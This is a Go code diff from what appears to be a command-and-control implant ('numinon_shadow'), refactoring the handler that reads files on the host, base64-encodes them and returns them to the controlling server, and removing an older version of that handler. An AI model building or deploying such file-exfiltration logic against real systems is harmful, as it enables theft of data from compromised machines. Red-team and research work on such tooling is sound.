@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"log"
 	"numinon_shadow/internal/agent/command/download"
-	"numinon_shadow/internal/agent/command/upload"
 	"numinon_shadow/internal/models"
 	"strings"
 )
@@ -46,6 +45,7 @@ func (a *Agent) orchestrateDownload(task models.ServerTaskResponse) models.Agent
 	if err != nil {
 		finalResult.Error = err.Error()
 
+		finalResult.Output = []byte(downloadResult.Message) // Send back any message from doer
 		log.Printf("|❗ERR DOWNLOAD ORCHESTATOR| Download execution failed for Task ID %s: %s.",
 			task.TaskID, finalResult.Error)
 
@@ -63,58 +63,13 @@ func (a *Agent) orchestrateDownload(task models.ServerTaskResponse) models.Agent
 		}
 	} else {
 		// If we get here it means our doer call succeeded
-
-		// Success from download.Execute()
 		// Base64 encode the raw file bytes for transport
-		// encodedContent := base64.StdEncoding.EncodeToString(downloadResult.RawFileBytes)
-		// finalResult.Output = []byte(encodedContent)
-
-		finalResult.Status = models.StatusSuccess
-		log.Printf("|✅ DOWNLOAD ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
-			task.TaskID, len(finalResult.Output))
-	}
-	return finalResult
-}
-
-// OLD ONE FOR REFERENCE
-func (a *Agent) handleDownloadFileTask(task models.ServerTaskResponse) models.TaskResult {
-
-	// Call the "doer" function
-	downloadOpResult, err := download.Execute(args, &a.config)
-
-	// Prepare the final TaskResult
-	finalResult := models.TaskResult{
-		TaskID:     task.TaskID,
-		FileSha256: downloadOpResult.FileSha256, // Hash of the raw file content
-		Output:     nil,                         // Will be base64 content on success
-		Error:      "",                          // Will be error message on failure
-	}
-
-	if err != nil {
-		finalResult.Error = err.Error()
-		finalResult.Output = []byte(downloadOpResult.Message) // Send back any message from doer
-		log.Printf("|❗ERR DOWNLOAD_FILE HANDLER| Download execution failed for Task ID %s: %s. Detailed Message: %s",
-			task.TaskID, finalResult.Error, downloadOpResult.Message)
-
-		errorString := finalResult.Error
-		switch {
-		case strings.Contains(errorString, "validation:"):
-			finalResult.Status = models.StatusFailureInvalidArgs
-		case strings.Contains(errorString, "File not found"):
-			finalResult.Status = models.StatusFailureFileNotFound // New status
-		case strings.Contains(errorString, "Permission denied"):
-			finalResult.Status = models.StatusFailurePermissionDenied
-		default:
-			finalResult.Status = models.StatusFailureReadError // General read error
-		}
-	} else {
-		// Success from download.Execute()
-		// Base64 encode the raw file bytes for transport
-		encodedContent := base64.StdEncoding.EncodeToString(downloadOpResult.RawFileBytes)
+		encodedContent := base64.StdEncoding.EncodeToString(downloadResult.RawFileBytes)
 		finalResult.Output = []byte(encodedContent)
 		finalResult.Status = models.StatusSuccess
-		log.Printf("|AGENT TASK DOWNLOAD_FILE HANDLER| Execution successful for Task ID %s. Sending %d base64 encoded bytes. Message: %s",
-			task.TaskID, len(finalResult.Output), downloadOpResult.Message)
+
+		log.Printf("|✅ DOWNLOAD ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
+			task.TaskID, len(finalResult.Output))
 	}
 	return finalResult
 }
